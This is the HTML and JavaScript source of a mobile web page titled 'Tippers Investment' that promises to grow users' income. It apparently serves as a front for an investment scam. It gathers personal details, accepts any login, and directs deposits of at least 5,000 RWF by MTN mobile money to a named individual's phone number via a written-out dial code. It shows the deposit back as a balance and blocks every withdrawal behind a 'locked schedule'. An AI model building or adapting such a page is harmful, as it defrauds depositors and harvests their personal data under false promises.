<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Tippers Investment</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>

body{
margin:0;
font-family:Segoe UI;
background:#0b1120;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}

.app{
width:390px;
background:#000;
border-radius:20px;
overflow:hidden;
color:white;
display:flex;
flex-direction:column;
}

.content{
padding:20px;
height:520px;
overflow-y:auto;
}

.title{
color:#f59e0b;
text-align:center;
font-weight:bold;
}

.desc{
color:white;
text-align:center;
margin-top:10px;
}

label{margin-top:10px;display:block}

input,select{
width:100%;
padding:10px;
margin-top:5px;
border-radius:8px;
border:none;
background:#0f172a;
color:white;
}

input::placeholder{color:#94a3b8}

button{
width:100%;
padding:12px;
margin-top:15px;
border:none;
border-radius:10px;
background:#f59e0b;
color:black;
font-weight:bold;
cursor:pointer;
}

.row{display:flex;gap:5px}

.nav{
display:flex;
justify-content:space-around;
background:black;
padding:10px;
}

.nav div{text-align:center;font-size:12px;cursor:pointer}

.nav i{font-size:22px;display:block}

.hidden{display:none}

#toast{
position:fixed;
bottom:20px;
left:50%;
transform:translateX(-50%);
background:black;
color:white;
padding:10px;
border-radius:8px;
display:none;
}

</style>
</head>

<body>

<div class="app">
<div class="content" id="screen"></div>

<div class="nav hidden" id="nav">
<div onclick="home()"><i>🏠</i>HOME</div>
<div onclick="withdraw()"><i>📤</i>WITHDRAW</div>
</div>
</div>

<div id="toast"></div>

<script>

let amount=0;
let paid=false;
let locked=true;

/* TOAST */
function toast(msg){
let t=document.getElementById("toast");
t.innerText=msg;
t.style.display="block";
setTimeout(()=>t.style.display="none",2000);
}

/* START */
function start(){
screen.innerHTML=`
<h2 class="title">WELCOME TO TIPPERS INVESTMENT APP !</h2>
<p class="desc">Start now and grow your income smartly in tippers earning every time.</p>
<button onclick="register()">START</button>
`;
}

/* REGISTER */
function register(){
screen.innerHTML=`

<h3 class="title">REGISTER</h3>

<label>First Name</label>
<input id="f">

<label>Last Name</label>
<input id="l">

<label>Gender</label>
<select id="g">
<option value="">select</option>
<option>Male</option>
<option>Female</option>
</select>

<label>Phone</label>
<div class="row">
<select id="code">
<option value="+250">RWA +250</option>
<option value="+254">KEN +254</option>
<option value="+256">UGA +256</option>
</select>
<input id="phone">
</div>

<label>Email</label>
<input id="email">

<label>Password</label>
<input id="pass">

<label>Confirm Password</label>
<input id="cpass">

<button onclick="reg()">REGISTER</button>
`;
}

function reg(){

if(!f.value||!l.value||!g.value||!phone.value||!email.value||!pass.value||!cpass.value){
toast("you are not allowe to cntinue without Fill all fields ❌"); return;
}

if(!email.value.endsWith("@gmail.com")){
toast("incorrect email address ❌   enter the vaid email"); return;
}

if(!/^[0-9]{6}$/.test(pass.value)){
toast("Password must be 6 digits ❌"); return;
}

if(pass.value!==cpass.value){
toast("Passwords not match ❌"); return;
}

if(code.value==="+250" && !phone.value.startsWith("07")){
toast("Invalid Rwanda number ❌"); return;
}

login();
}

/* LOGIN */
function login(){
screen.innerHTML=`

<h3 class="title">Login to continue</h3>

<label>Email</label>
<input id="le">

<label>Password</label>
<input id="lp">

<div style="display:flex;justify-content:space-between;margin-top:10px">
<span style="color:#f59e0b;cursor:pointer">Forgot password</span>
<span onclick="register()" style="color:#f59e0b;cursor:pointer">Create account</span>
</div>

<button onclick="log()">LOGIN</button>
`;
}

function log(){

if(!le.value||!lp.value){
toast("Fill all fields ❌"); return;
}

if(!lp.value.match(/^[0-9]{6}$/)){
toast("Invalid password ❌"); return;
}

deposit();
}

/* DEPOSIT */
function deposit(){
screen.innerHTML=`

<h3 class="title">DEPOSIT BALANCE</h3>
<p class="desc">Add funds using MTN mobile money</p>

<label>Amount (RWF)</label>
<input id="amt" placeholder="100000">

<p>Minimum: 5,000 RWF</p>

<label>Sender Name</label>
<input id="sender">

<button onclick="pay()">CONTINUE</button>
`;
}

function pay(){

amount=parseInt(amt.value);

if(!amount||amount<5000||!sender.value){
toast("Invalid input ❌"); return;
}

payment();
}

/* PAYMENT */
function payment(){
screen.innerHTML=`

<h3 class="title">PAYMENT INFORMATION</h3>

<p class="desc">Follow steps to complete payment</p>

<div style="background:#111;padding:10px;border-radius:10px">
0795410739
<br><br>
BARAKA BOLINGO
</div>

<button onclick="dial()">DIAL & PAY</button>
`;
}

/* DIAL */
function dial(){
screen.innerHTML=`

<div>*182*1*1*0795410739#</div>

<br><br>

<p class="desc">Upload proof of payment screenshot</p>

<input type="file" id="file">

<button onclick="submitProof()">SUBMIT</button>
`;
}

function submitProof(){

if(!file.value){
toast("Upload proof ❌"); return;
}

paid=true;
withdrawPeriod();
}

/* WITHDRAW PERIOD */
function withdrawPeriod(){
screen.innerHTML=`

<h3 class="title">WITHDRAW PERIOD</h3>

<select id="period">
<option>1 Day</option>
<option>1 Week</option>
<option>1 Month</option>
<option>2 Months</option>
<option>3 Months</option>
<option>4 Months</option>
<option>5 Months</option>
<option>6 Months</option>
<option>7 Months</option>
<option>8 Months</option>
<option>9 Months</option>
<option>10 Months</option>
<option>11 Months</option>
<option>12 Months</option>
</select>

<button onclick="confirm1()">SEND & CONFIRM</button>
`;
}

function confirm1(){
screen.innerHTML=`<button onclick="finish()">CONFIRM</button>`;
}

function finish(){
locked=true;
nav.classList.remove("hidden");
home();
}

/* HOME */
function home(){
if(locked){
screen.innerHTML=`
<h3 class="title">Balance: ${amount} RWF</h3>
<p class="desc">Wait until your selected withdraw schedule is reached.</p>
`;
}
}

/* WITHDRAW */
function withdraw(){

if(!paid){
toast("Complete deposit first ❌"); return;
}

screen.innerHTML=`

<label>Amount</label>
<input id="wamt">

<p>Minimum: 7500 RWF</p>

<div class="row">
<select id="wcode">
<option value="+250">RWA +250</option>
<option value="+254">KEN +254</option>
</select>

<input id="wphone">
</div>

<button onclick="doWithdraw()">WITHDRAW</button>
`;
}

function doWithdraw(){

let w=parseInt(wamt.value);

if(!w||w<7500){
toast("INVALID INPUT ❌"); return;
}

if(!wphone.value){
toast("Enter phone ❌"); return;
}

toast("You're not allowed to withdraw before the locked schedule.");
}

/* START */
start();

</script>

</body>
</html>
